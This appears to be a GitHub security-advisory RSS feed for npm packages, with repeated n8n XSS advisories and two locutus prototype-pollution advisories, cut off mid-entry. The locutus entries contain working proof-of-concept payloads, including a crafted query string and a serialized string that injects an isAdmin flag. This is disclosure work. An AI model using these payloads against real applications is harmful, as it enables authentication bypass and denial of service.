<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/npm.rss</id>
    <title>Security Advisory for JavaScript packages hosted at npmjs.com</title>
    <updated>2026-03-27T18:13:54.194Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"/>
    <subtitle>Security Advisory for JavaScript packages hosted at npmjs.com on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[n8n] n8n has XSS in its Credential Management Flow]]></title>
        <id>https://github.com/advisories/GHSA-364x-8g5j-x2pr</id>
        <link href="https://github.com/advisories/GHSA-364x-8g5j-x2pr"/>
        <updated>2026-03-27T18:08:16.000Z</updated>
        <content type="html"><![CDATA[<h2 id="impact">Impact</h2>
<p>An authenticated user with permission to create and share credentials could craft a malicious OAuth2 credential containing a JavaScript URL in the Authorization URL field. If a victim opened the credential and interacted with the OAuth authorization button, the injected script would execute in their browser session.</p>
<h2 id="patches">Patches</h2>
<p>The issue has been fixed in n8n versions 2.8.0 and 2.6.4. Users should upgrade to one of these versions or later to remediate the vulnerability.</p>
<h2 id="workarounds">Workarounds</h2>
<p>If upgrading is not immediately possible, administrators should consider the following temporary mitigations:</p>
<ul>
<li>Limit credential creation and sharing permissions to fully trusted users only.</li>
<li>Restrict access to the n8n instance to trusted users only.</li>
</ul>
<p>These workarounds do not fully remediate the risk and should only be used as short-term mitigation measures.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/n8n-io/n8n/security/advisories/GHSA-364x-8g5j-x2pr">https://github.com/n8n-io/n8n/security/advisories/GHSA-364x-8g5j-x2pr</a></li>
<li><a href="https://github.com/advisories/GHSA-364x-8g5j-x2pr">https://github.com/advisories/GHSA-364x-8g5j-x2pr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-364x-8g5j-x2pr</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-03-27T18:08:15.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[n8n] n8n has XSS in its Credential Management Flow]]></title>
        <id>https://github.com/advisories/GHSA-364x-8g5j-x2pr</id>
        <link href="https://github.com/advisories/GHSA-364x-8g5j-x2pr"/>
        <updated>2026-03-27T18:08:16.000Z</updated>
        <content type="html"><![CDATA[<h2 id="impact">Impact</h2>
<p>An authenticated user with permission to create and share credentials could craft a malicious OAuth2 credential containing a JavaScript URL in the Authorization URL field. If a victim opened the credential and interacted with the OAuth authorization button, the injected script would execute in their browser session.</p>
<h2 id="patches">Patches</h2>
<p>The issue has been fixed in n8n versions 2.8.0 and 2.6.4. Users should upgrade to one of these versions or later to remediate the vulnerability.</p>
<h2 id="workarounds">Workarounds</h2>
<p>If upgrading is not immediately possible, administrators should consider the following temporary mitigations:</p>
<ul>
<li>Limit credential creation and sharing permissions to fully trusted users only.</li>
<li>Restrict access to the n8n instance to trusted users only.</li>
</ul>
<p>These workarounds do not fully remediate the risk and should only be used as short-term mitigation measures.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/n8n-io/n8n/security/advisories/GHSA-364x-8g5j-x2pr">https://github.com/n8n-io/n8n/security/advisories/GHSA-364x-8g5j-x2pr</a></li>
<li><a href="https://github.com/advisories/GHSA-364x-8g5j-x2pr">https://github.com/advisories/GHSA-364x-8g5j-x2pr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-364x-8g5j-x2pr</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-03-27T18:08:15.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[n8n] n8n has XSS in Chat Trigger Node through Custom CSS]]></title>
        <id>https://github.com/advisories/GHSA-3c7f-5hgj-h279</id>
        <link href="https://github.com/advisories/GHSA-3c7f-5hgj-h279"/>
        <updated>2026-03-27T18:06:50.000Z</updated>
        <content type="html"><![CDATA[<h2 id="impact">Impact</h2>
<p>An authenticated user with permission to create or modify workflows could inject malicious JavaScript into the Custom CSS field of the Chat Trigger node. Due to a misconfiguration in the <code>sanitize-html</code> library, the sanitization could be bypassed, resulting in stored XSS on the public chat page. Any user visiting the chat URL would be affected.</p>
<h2 id="patches">Patches</h2>
<p>The issue has been fixed in n8n versions 1.123.27, 2.13.3, and 2.14.1. Users should upgrade to one of these versions or later to remediate the vulnerability.</p>
<h2 id="workarounds">Workarounds</h2>
<p>If upgrading is not immediately possible, administrators should consider the following temporary mitigations:</p>
<ul>
<li>Limit workflow creation and editing permissions to fully trusted users only.</li>
<li>Disable the Chat Trigger node by adding <code>@n8n/n8n-nodes-langchain.chatTrigger</code> to the <code>NODES_EXCLUDE</code> environment variable.</li>
</ul>
<p>These workarounds do not fully remediate the risk and should only be used as short-term mitigation measures.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/n8n-io/n8n/security/advisories/GHSA-3c7f-5hgj-h279">https://github.com/n8n-io/n8n/security/advisories/GHSA-3c7f-5hgj-h279</a></li>
<li><a href="https://github.com/advisories/GHSA-3c7f-5hgj-h279">https://github.com/advisories/GHSA-3c7f-5hgj-h279</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3c7f-5hgj-h279</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-03-27T18:06:49.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[n8n] n8n has XSS in Chat Trigger Node through Custom CSS]]></title>
        <id>https://github.com/advisories/GHSA-3c7f-5hgj-h279</id>
        <link href="https://github.com/advisories/GHSA-3c7f-5hgj-h279"/>
        <updated>2026-03-27T18:06:50.000Z</updated>
        <content type="html"><![CDATA[<h2 id="impact">Impact</h2>
<p>An authenticated user with permission to create or modify workflows could inject malicious JavaScript into the Custom CSS field of the Chat Trigger node. Due to a misconfiguration in the <code>sanitize-html</code> library, the sanitization could be bypassed, resulting in stored XSS on the public chat page. Any user visiting the chat URL would be affected.</p>
<h2 id="patches">Patches</h2>
<p>The issue has been fixed in n8n versions 1.123.27, 2.13.3, and 2.14.1. Users should upgrade to one of these versions or later to remediate the vulnerability.</p>
<h2 id="workarounds">Workarounds</h2>
<p>If upgrading is not immediately possible, administrators should consider the following temporary mitigations:</p>
<ul>
<li>Limit workflow creation and editing permissions to fully trusted users only.</li>
<li>Disable the Chat Trigger node by adding <code>@n8n/n8n-nodes-langchain.chatTrigger</code> to the <code>NODES_EXCLUDE</code> environment variable.</li>
</ul>
<p>These workarounds do not fully remediate the risk and should only be used as short-term mitigation measures.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/n8n-io/n8n/security/advisories/GHSA-3c7f-5hgj-h279">https://github.com/n8n-io/n8n/security/advisories/GHSA-3c7f-5hgj-h279</a></li>
<li><a href="https://github.com/advisories/GHSA-3c7f-5hgj-h279">https://github.com/advisories/GHSA-3c7f-5hgj-h279</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3c7f-5hgj-h279</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-03-27T18:06:49.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[n8n] n8n has XSS in Chat Trigger Node through Custom CSS]]></title>
        <id>https://github.com/advisories/GHSA-3c7f-5hgj-h279</id>
        <link href="https://github.com/advisories/GHSA-3c7f-5hgj-h279"/>
        <updated>2026-03-27T18:06:50.000Z</updated>
        <content type="html"><![CDATA[<h2 id="impact">Impact</h2>
<p>An authenticated user with permission to create or modify workflows could inject malicious JavaScript into the Custom CSS field of the Chat Trigger node. Due to a misconfiguration in the <code>sanitize-html</code> library, the sanitization could be bypassed, resulting in stored XSS on the public chat page. Any user visiting the chat URL would be affected.</p>
<h2 id="patches">Patches</h2>
<p>The issue has been fixed in n8n versions 1.123.27, 2.13.3, and 2.14.1. Users should upgrade to one of these versions or later to remediate the vulnerability.</p>
<h2 id="workarounds">Workarounds</h2>
<p>If upgrading is not immediately possible, administrators should consider the following temporary mitigations:</p>
<ul>
<li>Limit workflow creation and editing permissions to fully trusted users only.</li>
<li>Disable the Chat Trigger node by adding <code>@n8n/n8n-nodes-langchain.chatTrigger</code> to the <code>NODES_EXCLUDE</code> environment variable.</li>
</ul>
<p>These workarounds do not fully remediate the risk and should only be used as short-term mitigation measures.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/n8n-io/n8n/security/advisories/GHSA-3c7f-5hgj-h279">https://github.com/n8n-io/n8n/security/advisories/GHSA-3c7f-5hgj-h279</a></li>
<li><a href="https://github.com/advisories/GHSA-3c7f-5hgj-h279">https://github.com/advisories/GHSA-3c7f-5hgj-h279</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3c7f-5hgj-h279</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-03-27T18:06:49.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[n8n] n8n: Authenticated XSS and Open Redirect via Form Node]]></title>
        <id>https://github.com/advisories/GHSA-w673-8fjw-457c</id>
        <link href="https://github.com/advisories/GHSA-w673-8fjw-457c"/>
        <updated>2026-03-27T18:06:29.000Z</updated>
        <content type="html"><![CDATA[<h2 id="impact">Impact</h2>
<p>An authenticated user with permission to create or modify workflows could configure a Form Node with an unsanitized HTML description field or exploit an overly permissive iframe sandbox policy to perform stored cross-site scripting or redirect end users visiting the form to an arbitrary external URL. The vulnerability could be used to facilitate phishing attacks.</p>
<h2 id="patches">Patches</h2>
<p>The issue has been fixed in n8n versions 1.123.24, 2.10.4 and 2.12.0. Users should upgrade to one of these versions or later to remediate the vulnerability.</p>
<h2 id="workarounds">Workarounds</h2>
<p>If upgrading is not immediately possible, administrators should consider the following temporary mitigations:</p>
<ul>
<li>Limit workflow creation and editing permissions to fully trusted users only.</li>
<li>Disable the Form node by adding <code>n8n-nodes-base.form</code> to the <code>NODES_EXCLUDE</code> environment variable.</li>
<li>Disable the Form Trigger node by adding <code>n8n-nodes-base.formTrigger</code> to the <code>NODES_EXCLUDE</code> environment variable.</li>
</ul>
<p>These workarounds do not fully remediate the risk and should only be used as short-term mitigation measures.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/n8n-io/n8n/security/advisories/GHSA-w673-8fjw-457c">https://github.com/n8n-io/n8n/security/advisories/GHSA-w673-8fjw-457c</a></li>
<li><a href="https://github.com/advisories/GHSA-w673-8fjw-457c">https://github.com/advisories/GHSA-w673-8fjw-457c</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-w673-8fjw-457c</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-03-27T18:06:28.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[n8n] n8n: Authenticated XSS and Open Redirect via Form Node]]></title>
        <id>https://github.com/advisories/GHSA-w673-8fjw-457c</id>
        <link href="https://github.com/advisories/GHSA-w673-8fjw-457c"/>
        <updated>2026-03-27T18:06:29.000Z</updated>
        <content type="html"><![CDATA[<h2 id="impact">Impact</h2>
<p>An authenticated user with permission to create or modify workflows could configure a Form Node with an unsanitized HTML description field or exploit an overly permissive iframe sandbox policy to perform stored cross-site scripting or redirect end users visiting the form to an arbitrary external URL. The vulnerability could be used to facilitate phishing attacks.</p>
<h2 id="patches">Patches</h2>
<p>The issue has been fixed in n8n versions 1.123.24, 2.10.4 and 2.12.0. Users should upgrade to one of these versions or later to remediate the vulnerability.</p>
<h2 id="workarounds">Workarounds</h2>
<p>If upgrading is not immediately possible, administrators should consider the following temporary mitigations:</p>
<ul>
<li>Limit workflow creation and editing permissions to fully trusted users only.</li>
<li>Disable the Form node by adding <code>n8n-nodes-base.form</code> to the <code>NODES_EXCLUDE</code> environment variable.</li>
<li>Disable the Form Trigger node by adding <code>n8n-nodes-base.formTrigger</code> to the <code>NODES_EXCLUDE</code> environment variable.</li>
</ul>
<p>These workarounds do not fully remediate the risk and should only be used as short-term mitigation measures.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/n8n-io/n8n/security/advisories/GHSA-w673-8fjw-457c">https://github.com/n8n-io/n8n/security/advisories/GHSA-w673-8fjw-457c</a></li>
<li><a href="https://github.com/advisories/GHSA-w673-8fjw-457c">https://github.com/advisories/GHSA-w673-8fjw-457c</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-w673-8fjw-457c</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-03-27T18:06:28.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[n8n] n8n: Authenticated XSS and Open Redirect via Form Node]]></title>
        <id>https://github.com/advisories/GHSA-w673-8fjw-457c</id>
        <link href="https://github.com/advisories/GHSA-w673-8fjw-457c"/>
        <updated>2026-03-27T18:06:29.000Z</updated>
        <content type="html"><![CDATA[<h2 id="impact">Impact</h2>
<p>An authenticated user with permission to create or modify workflows could configure a Form Node with an unsanitized HTML description field or exploit an overly permissive iframe sandbox policy to perform stored cross-site scripting or redirect end users visiting the form to an arbitrary external URL. The vulnerability could be used to facilitate phishing attacks.</p>
<h2 id="patches">Patches</h2>
<p>The issue has been fixed in n8n versions 1.123.24, 2.10.4 and 2.12.0. Users should upgrade to one of these versions or later to remediate the vulnerability.</p>
<h2 id="workarounds">Workarounds</h2>
<p>If upgrading is not immediately possible, administrators should consider the following temporary mitigations:</p>
<ul>
<li>Limit workflow creation and editing permissions to fully trusted users only.</li>
<li>Disable the Form node by adding <code>n8n-nodes-base.form</code> to the <code>NODES_EXCLUDE</code> environment variable.</li>
<li>Disable the Form Trigger node by adding <code>n8n-nodes-base.formTrigger</code> to the <code>NODES_EXCLUDE</code> environment variable.</li>
</ul>
<p>These workarounds do not fully remediate the risk and should only be used as short-term mitigation measures.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/n8n-io/n8n/security/advisories/GHSA-w673-8fjw-457c">https://github.com/n8n-io/n8n/security/advisories/GHSA-w673-8fjw-457c</a></li>
<li><a href="https://github.com/advisories/GHSA-w673-8fjw-457c">https://github.com/advisories/GHSA-w673-8fjw-457c</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-w673-8fjw-457c</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-03-27T18:06:28.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[n8n] n8n has a Stored XSS Vulnerability in its Form Trigger]]></title>
        <id>https://github.com/advisories/GHSA-q4fm-pjq6-m63g</id>
        <link href="https://github.com/advisories/GHSA-q4fm-pjq6-m63g"/>
        <updated>2026-03-27T18:05:48.000Z</updated>
        <content type="html"><![CDATA[<h2 id="impact">Impact</h2>
<p>An authenticated user with permission to create or modify workflows could exploit a flaw in the Form Trigger node's CSS sanitization to store a cross-site scripting (XSS) payload. The injected script executes persistently for every visitor of the published form, enabling form submission hijacking and phishing. The existing Content Security Policy prevents direct n8n session cookie theft but does not prevent script execution or form action manipulation.</p>
<h2 id="patches">Patches</h2>
<p>The issue has been fixed in n8n versions 2.12.0, 2.11.2, and 1.123.25. Users should upgrade to one of these versions or later to remediate the vulnerability.</p>
<h2 id="workarounds">Workarounds</h2>
<p>If upgrading is not immediately possible, administrators should consider the following temporary mitigations:</p>
<ul>
<li>Limit workflow creation and editing permissions to fully trusted users only.</li>
<li>Disable the Form Trigger node by adding <code>n8n-nodes-base.formTrigger</code> to the <code>NODES_EXCLUDE</code> environment variable.</li>
</ul>
<p>These workarounds do not fully remediate the risk and should only be used as short-term mitigation measures.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/n8n-io/n8n/security/advisories/GHSA-q4fm-pjq6-m63g">https://github.com/n8n-io/n8n/security/advisories/GHSA-q4fm-pjq6-m63g</a></li>
<li><a href="https://github.com/advisories/GHSA-q4fm-pjq6-m63g">https://github.com/advisories/GHSA-q4fm-pjq6-m63g</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-q4fm-pjq6-m63g</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-03-27T18:05:47.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[n8n] n8n has a Stored XSS Vulnerability in its Form Trigger]]></title>
        <id>https://github.com/advisories/GHSA-q4fm-pjq6-m63g</id>
        <link href="https://github.com/advisories/GHSA-q4fm-pjq6-m63g"/>
        <updated>2026-03-27T18:05:48.000Z</updated>
        <content type="html"><![CDATA[<h2 id="impact">Impact</h2>
<p>An authenticated user with permission to create or modify workflows could exploit a flaw in the Form Trigger node's CSS sanitization to store a cross-site scripting (XSS) payload. The injected script executes persistently for every visitor of the published form, enabling form submission hijacking and phishing. The existing Content Security Policy prevents direct n8n session cookie theft but does not prevent script execution or form action manipulation.</p>
<h2 id="patches">Patches</h2>
<p>The issue has been fixed in n8n versions 2.12.0, 2.11.2, and 1.123.25. Users should upgrade to one of these versions or later to remediate the vulnerability.</p>
<h2 id="workarounds">Workarounds</h2>
<p>If upgrading is not immediately possible, administrators should consider the following temporary mitigations:</p>
<ul>
<li>Limit workflow creation and editing permissions to fully trusted users only.</li>
<li>Disable the Form Trigger node by adding <code>n8n-nodes-base.formTrigger</code> to the <code>NODES_EXCLUDE</code> environment variable.</li>
</ul>
<p>These workarounds do not fully remediate the risk and should only be used as short-term mitigation measures.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/n8n-io/n8n/security/advisories/GHSA-q4fm-pjq6-m63g">https://github.com/n8n-io/n8n/security/advisories/GHSA-q4fm-pjq6-m63g</a></li>
<li><a href="https://github.com/advisories/GHSA-q4fm-pjq6-m63g">https://github.com/advisories/GHSA-q4fm-pjq6-m63g</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-q4fm-pjq6-m63g</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-03-27T18:05:47.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[locutus] Locutus Prototype Pollution due to incomplete fix for CVE-2026-25521]]></title>
        <id>https://github.com/advisories/GHSA-vc8f-x9pp-wf5p</id>
        <link href="https://github.com/advisories/GHSA-vc8f-x9pp-wf5p"/>
        <updated>2026-03-27T17:58:49.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>A prototype pollution vulnerability exists in the <code>parse_str</code> function of the npm package locutus. An attacker can pollute <code>Object.prototype</code> by overriding <code>RegExp.prototype.test</code> and then passing a crafted query string to <code>parse_str</code>, bypassing the prototype pollution guard.</p>
<p>This vulnerability stems from an incomplete fix for <a href="https://github.com/locutusjs/locutus/security/advisories/GHSA-rxrv-835q-v5mh">CVE-2026-25521</a>. The CVE-2026-25521 patch replaced the <code>String.prototype.includes()</code>-based guard with a <code>RegExp.prototype.test()</code>-based guard. However, <code>RegExp.prototype.test</code> is itself a writable prototype method that can be overridden, making the new guard bypassable in the same way as the original — trading one hijackable built-in for another.</p>
<h2 id="package">Package</h2>
<p>locutus (npm)</p>
<h2 id="affected-versions">Affected versions</h2>
<blockquote>
<p>= 2.0.39, &lt;= 3.0.24</p>
</blockquote>
<p>Tested and confirmed vulnerable on <strong>2.0.39</strong> and <strong>3.0.24</strong> (latest). Version 2.0.38 (pre-fix) uses a different guard (<code>String.prototype.includes</code>) and is not affected by this specific bypass.</p>
<hr>
<h2 id="description">Description</h2>
<h3 id="details">Details</h3>
<p>The vulnerability resides in <code>parse_str.js</code> where the <code>RegExp.prototype.test()</code> function is used to check whether user-provided input contains forbidden keys:</p>
<pre><code class="language-javascript">if (/__proto__|constructor|prototype/.test(key)) {
  break
}
</code></pre>
<p>The previous guard (fixed in CVE-2026-25521) used <code>String.prototype.includes()</code>:</p>
<pre><code class="language-javascript">if (key.includes('__proto__')) {
  break
}
</code></pre>
<p>The CVE-2026-25521 fix correctly identified that <code>String.prototype.includes</code> can be hijacked. However, the replacement guard using <code>RegExp.prototype.test()</code> suffers from the same class of weakness — <code>RegExp.prototype.test</code> is a writable method on the prototype chain and can be overridden to always return <code>false</code>, completely disabling the guard.</p>
<p>The robust fix is to use direct string comparison operators (<code>===</code>) in native control flow (<code>for</code>/<code>if</code>) instead of prototype methods like <code>RegExp.prototype.test()</code>, since <code>===</code> is a language-level operator that cannot be overridden.</p>
<h3 id="poc">PoC</h3>
<h4 id="steps-to-reproduce">Steps to reproduce</h4>
<ol>
<li>Install locutus using <code>npm install locutus</code></li>
<li>Run the following code snippet:</li>
</ol>
<pre><code class="language-javascript">const parse_str = require('locutus/php/strings/parse_str');

// Hijack RegExp.prototype.test (simulates a prior prototype pollution gadget)
const original = RegExp.prototype.test;
RegExp.prototype.test = function () { return false; };

// Payload
const result = {};
parse_str('__proto__[polluted]=yes', result);

// Check
RegExp.prototype.test = original;
console.log(({}).polluted); // 'yes' — prototype is polluted
</code></pre>
<h4 id="expected-behavior">Expected behavior</h4>
<p>Prototype pollution should be prevented and <code>({}).polluted</code> should print <code>undefined</code>.</p>
<pre><code>undefined
</code></pre>
<h4 id="actual-behavior">Actual behavior</h4>
<p><code>Object.prototype</code> is polluted. This is printed on the console:</p>
<pre><code>yes
</code></pre>
<h3 id="impact">Impact</h3>
<p>This is a prototype pollution vulnerability with the same impact as CVE-2026-25521. The attack requires a chaining scenario — an attacker needs a separate prototype pollution gadget (e.g., from another npm package in the same application) to override <code>RegExp.prototype.test</code> before exploiting <code>parse_str</code>. This is realistic in Node.js applications that use multiple npm packages, where one package's vulnerability can disable another package's defenses.</p>
<p>Any application that processes attacker-controlled input using <code>locutus/php/strings/parse_str</code> may be affected. It could potentially lead to:</p>
<ol>
<li>Authentication bypass</li>
<li>Denial of service</li>
<li>Remote code execution (if polluted property is passed to sinks like <code>eval</code> or <code>child_process</code>)</li>
</ol>
<h3 id="resources">Resources</h3>
<ul>
<li>Original advisory: <a href="https://github.com/locutusjs/locutus/security/advisories/GHSA-rxrv-835q-v5mh">https://github.com/locutusjs/locutus/security/advisories/GHSA-rxrv-835q-v5mh</a></li>
<li>Fix commit (incomplete): <a href="https://github.com/locutusjs/locutus/commit/042af9ca7fde2ff599120783e720a17f335bb01c">https://github.com/locutusjs/locutus/commit/042af9ca7fde2ff599120783e720a17f335bb01c</a></li>
<li>Vulnerable file: <a href="https://github.com/locutusjs/locutus/blob/main/src/php/strings/parse_str.js#L77">https://github.com/locutusjs/locutus/blob/main/src/php/strings/parse_str.js#L77</a></li>
</ul>
<h2 id="maintainer-response">Maintainer response</h2>
<p>Thank you for the follow-up report. This issue was reproduced locally against <code>locutus@3.0.24</code>, confirming that the earlier <code>parse_str</code> guard was incomplete: if <code>RegExp.prototype.test</code> was already compromised, the guard could be bypassed and <code>parse_str('__proto__[polluted]=yes', result)</code> could still pollute <code>Object.prototype</code>.</p>
<p>This is now fixed on <code>main</code> and released in <code>locutus@3.0.25</code>.</p>
<h2 id="fix-shipped-in">Fix Shipped In</h2>
<ul>
<li><strong>PR:</strong> <a href="https://github.com/locutusjs/locutus/pull/597">locutusjs/locutus#597</a></li>
<li><strong>Merge commit on <code>main</code>:</strong> <code>345a6211e1e6f939f96a7090bfeff642c9fcf9e4</code></li>
<li><strong>Release:</strong> <a href="https://github.com/locutusjs/locutus/releases/tag/v3.0.25">v3.0.25</a></li>
</ul>
<h2 id="what-the-fix-does">What the Fix Does</h2>
<p>The new fix no longer relies on a regex-prototype guard for safety. Instead, <code>src/php/strings/parse_str.ts</code> now rejects dangerous key paths during parsed-segment assignment, so the sink itself is hardened even if <code>RegExp.prototype.test</code> has been tampered with beforehand.</p>
<h2 id="tested-repro-before-the-fix">Tested Repro Before the Fix</h2>
<ul>
<li>Override <code>RegExp.prototype.test</code> to always return <code>false</code></li>
<li>Call <code>parse_str('__proto__[polluted]=yes', result)</code></li>
<li>Observe <code>({}).polluted === 'yes'</code></li>
</ul>
<h2 id="tested-state-after-the-fix-in-3025">Tested State After the Fix in <code>3.0.25</code></h2>
<ul>
<li>Dangerous key paths are skipped during assignment</li>
<li>The same chained repro no longer pollutes <code>Object.prototype</code></li>
<li>The regression is covered by <code>test/custom/parse_str-prototype-pollution.vitest.ts</code></li>
</ul>
<hr>
<p>The locutus team is treating this as a real package vulnerability with patched version <code>3.0.25</code>. The vulnerable range should end at <code>&lt; 3.0.25</code>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/locutusjs/locutus/security/advisories/GHSA-rxrv-835q-v5mh">https://github.com/locutusjs/locutus/security/advisories/GHSA-rxrv-835q-v5mh</a></li>
<li><a href="https://github.com/locutusjs/locutus/security/advisories/GHSA-vc8f-x9pp-wf5p">https://github.com/locutusjs/locutus/security/advisories/GHSA-vc8f-x9pp-wf5p</a></li>
<li><a href="https://github.com/locutusjs/locutus/pull/597">https://github.com/locutusjs/locutus/pull/597</a></li>
<li><a href="https://github.com/locutusjs/locutus/commit/345a6211e1e6f939f96a7090bfeff642c9fcf9e4">https://github.com/locutusjs/locutus/commit/345a6211e1e6f939f96a7090bfeff642c9fcf9e4</a></li>
<li><a href="https://github.com/locutusjs/locutus/releases/tag/v3.0.25">https://github.com/locutusjs/locutus/releases/tag/v3.0.25</a></li>
<li><a href="https://github.com/advisories/GHSA-vc8f-x9pp-wf5p">https://github.com/advisories/GHSA-vc8f-x9pp-wf5p</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vc8f-x9pp-wf5p</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-03-27T17:58:48.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[locutus] Locutus has Prototype Pollution via __proto__ Key Injection in unserialize()]]></title>
        <id>https://github.com/advisories/GHSA-4mph-v827-f877</id>
        <link href="https://github.com/advisories/GHSA-4mph-v827-f877"/>
        <updated>2026-03-27T17:57:40.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>The <code>unserialize()</code> function in <code>locutus/php/var/unserialize</code> assigns deserialized keys to plain objects via bracket notation without filtering the <code>__proto__</code> key. When a PHP serialized payload contains <code>__proto__</code> as an array or object key, JavaScript's <code>__proto__</code> setter is invoked, replacing the deserialized object's prototype with attacker-controlled content. This enables property injection, for...in propagation of injected properties, and denial of service via built-in method override.</p>
<p>This is distinct from the previously reported prototype pollution in <code>parse_str</code> (GHSA-f98m-q3hr-p5wq, GHSA-rxrv-835q-v5mh) — <code>unserialize</code> is a different function with no mitigation applied.</p>
<h2 id="details">Details</h2>
<p>The vulnerable code is in two functions within <code>src/php/var/unserialize.ts</code>:</p>
<p><strong><code>expectArrayItems()</code> at line 358:</strong></p>
<pre><code class="language-typescript">// src/php/var/unserialize.ts:329-366
function expectArrayItems(
  str: string,
  expectedItems = 0,
  cache: CacheFn,
): [UnserializedObject | UnserializedValue[], number] {
  // ...
  const items: UnserializedObject = {}
  // ...
  for (let i = 0; i &lt; expectedItems; i++) {
    key = expectKeyOrIndex(str)
    // ...
    item = expectType(str, cache)
    // ...
    items[String(key[0])] = item[0]  // line 358 — no __proto__ filtering
  }
  // ...
}
</code></pre>
<p><strong><code>expectObject()</code> at line 278:</strong></p>
<pre><code class="language-typescript">// src/php/var/unserialize.ts:246-287
function expectObject(str: string, cache: CacheFn): ParsedResult {
  // ...
  const obj: UnserializedObject = {}
  // ...
  for (let i = 0; i &lt; propCount; i++) {
    // ...
    obj[String(prop[0])] = value[0]  // line 278 — no __proto__ filtering
  }
  // ...
}
</code></pre>
<p>Both functions create a plain object (<code>{}</code>) and assign user-controlled keys via bracket notation. When the key is <code>__proto__</code>, JavaScript's <code>__proto__</code> setter replaces the object's prototype rather than creating a regular property. This means:</p>
<ol>
<li>Properties in the attacker-supplied prototype become accessible via dot notation and the <code>in</code> operator</li>
<li>These properties are invisible to <code>Object.keys()</code>, <code>JSON.stringify()</code>, and <code>hasOwnProperty()</code></li>
<li>They propagate to copies made via <code>for...in</code> loops, becoming real own properties</li>
<li>The attacker can override <code>hasOwnProperty</code>, <code>toString</code>, <code>valueOf</code> with non-function values</li>
</ol>
<p>Notably, <code>parse_str</code> in the same package has a regex guard against <code>__proto__</code> (line 74 of <code>src/php/strings/parse_str.ts</code>), but no equivalent protection was applied to <code>unserialize</code>.</p>
<p>This is <strong>not</strong> global <code>Object.prototype</code> pollution — only the deserialized object's prototype is replaced. Other objects in the application are not affected.</p>
<h2 id="poc">PoC</h2>
<p><strong>Setup:</strong></p>
<pre><code class="language-bash">npm install locutus@3.0.24
</code></pre>
<p><strong>Step 1 — Property injection via array deserialization:</strong></p>
<pre><code class="language-js">import { unserialize } from 'locutus/php/var/unserialize';

const payload = 'a:2:{s:9:"__proto__";a:1:{s:7:"isAdmin";b:1;}s:4:"name";s:3:"bob";}';
const config = unserialize(payload);

console.log(config.isAdmin);           // true (injected via prototype)
console.log(Object.keys(config));      // ['name'] — isAdmin is hidden
